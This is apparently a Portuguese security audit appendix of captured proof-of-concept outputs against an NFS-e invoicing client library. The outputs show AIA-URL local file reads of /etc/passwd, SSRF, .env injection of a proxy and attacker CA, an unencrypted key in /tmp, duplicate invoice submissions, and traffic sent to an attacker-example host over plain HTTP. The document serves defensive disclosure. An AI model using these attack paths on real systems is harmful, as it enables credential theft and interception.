# Saídas capturadas

Ambiente: Python 3.11.15, `nfe_simples@a20bada` instalado com `pip install -e ".[dev]"`,
lxml 6.1.2 / libxml2 2.14.6, cryptography 50.0.0, requests 2.x. Certificados `.pfx`
auto-assinados gerados por `poc/mkcert.py`. Nenhuma requisição foi feita à API da SEFIN.

```console
$ python poc1_aia.py
[*] pfx com AIA = file:///etc/passwd
    urlopen alcancado: ['file:///etc/passwd']
    leitura local confirmada, 1a linha: b'root:x:0:0:root:/root:/bin/bash'
[*] pfx com AIA = http://127.0.0.1:8899/cadeia-interna
    urlopen alcancado: ['http://127.0.0.1:8899/cadeia-interna']
    requisicoes recebidas pelo servidor interno: ['/cadeia-interna']

$ python poc3_disk.py
[*] arquivos temporarios de mTLS:
    /tmp/nfe-cert-30fxrs_1.pem  modo=-rw-------
    /tmp/nfe-key-dux2kpfa.pem  modo=-rw-------
    primeira linha da chave: -----BEGIN PRIVATE KEY-----   <- PKCS8 SEM criptografia (NoEncryption)
    dir do arquivo: /tmp  modo do dir: drwxrwxrwt

[*] saidas do CLI (mkdir/write_text sem modo explicito):
    drwxr-xr-x  demo_results
    drwxr-xr-x  demo_results/2026-08-21_355030821234567800019910000000000000001
    -rw-r--r--  demo_results/2026-08-21_355030821234567800019910000000000000001/resultado.json
    -rw-r--r--  demo_results/2026-08-21_355030821234567800019910000000000000001/dps-assinada.xml
    umask atual: 0o22

$ python poc4_retry.py
[*] base_url aceita pelo cliente: http://127.0.0.1:46753  (esquema http, sem TLS, sem aviso)
[*] retorno: {'nfseId': 'DUPLICADA'}
[!] POST /nfse recebidos pelo servidor: 2 -> ['/nfse', '/nfse']
    a MESMA nota foi transmitida 2 vezes.

$ python poc5_misc.py
[a] .env: CERT_PASSWORD="Ab#123""  ->  lido como 'Ab#123' (esperado 'Ab#123"')
[a] X_TRAILING -> 'valor com espaco'
[b] environment = producao | verify_tls = False | base_url = http://api-do-atacante.example/SefinNacional
[b] validacao de esquema/host da URL: nenhuma  -> DPS assinada enviada em texto claro
[c] retries=1 -> ate 2 POSTs /nfse, sem backoff e sem chave de idempotencia

$ python poc6_xml.py
lxml (6, 1, 2, 0) libxml2 (2, 14, 6)
[*] entidade EXTERNA no parser padrao -> bloqueada pelo libxml2: Entity 'xxe' not defined, line 3, column 76 (<string>, line 3)
[*] entidades INTERNAS no parser padrao -> 10000 bytes a partir de ~300 bytes de entrada
[*] com parser endurecido, entidades internas -> None

$ env -i PATH=... python poc2_dotenv.py   # ambiente limpo, sem proxy herdado
[*] antes: HTTPS_PROXY= None REQUESTS_CA_BUNDLE= None
[*] depois de load_params():
    HTTPS_PROXY = http://127.0.0.1:9999
    REQUESTS_CA_BUNDLE = /tmp/ca-do-atacante.pem
    CURL_CA_BUNDLE = /tmp/ca-do-atacante.pem
[*] requests resolve o proxy a partir do env: {'https': 'http://127.0.0.1:9999'}
[*] merge_environment_settings verify -> /tmp/ca-do-atacante.pem

$ bandit -r src
>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
   Location: src/nfe/config.py:47:8
>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
   Location: src/nfe/config.py:59:8
>> Issue: [B112:try_except_continue] Try, Except, Continue detected.
   Location: src/nfe/config.py:96:12
	Total lines skipped (#nosec): 0
	Total potential issues skipped due to specifically being disabled (e.g., #nosec BXXX): 1
	Total issues (by severity):
		Low: 3
		Medium: 0
		High: 0
	Total issues (by confidence):
		Low: 0
		Medium: 0
		High: 3
```

## Leitura

- **PoC-1** (achado #2): `urlopen` alcança `file://` e um host interno via `http://`, ambos vindos da
  extensão AIA do `.pfx`. Sem allowlist de esquema, sem limite de tamanho.
- **PoC-2** (achado #1): em ambiente limpo, o `.env` ao lado do `params.json` injeta `HTTPS_PROXY` e
  `REQUESTS_CA_BUNDLE`; o `requests` passa a resolver proxy do atacante e a validar contra a CA dele.
- **PoC-3** (achado #5): chave PKCS#8 sem criptografia em `/tmp` (world-writable), e saídas fiscais
  `0755`/`0644`.
- **PoC-4** (achado #4): resposta perdida após o servidor processar o POST → **duas** emissões da
  mesma nota. A URL `http://` foi aceita sem qualquer aviso.
- **PoC-5** (achados #3 e #8): `producao` + `verify_tls: false` + `http://` aceitos em silêncio;
  senha com aspas corrompida pelo parser do `.env`.
- **PoC-6** (achado #6, negativo): XXE **não** é explorável no libxml2 atual — entidades externas já
  vêm bloqueadas. Entidades internas expandem. Fica como endurecimento, não vulnerabilidade.
- **bandit**: 3 achados Low, todos `try/except/pass`. O `B310` que apontaria o achado #2 foi
  suprimido pelo `# nosec` no próprio código (`Total potential issues skipped ...: 1`). Nenhum dos
  achados Alta aparece — é a diferença entre casar padrão e raciocinar sobre fluxo de dados.
- **pip-audit** contra as dependências declaradas: `No known vulnerabilities found`.
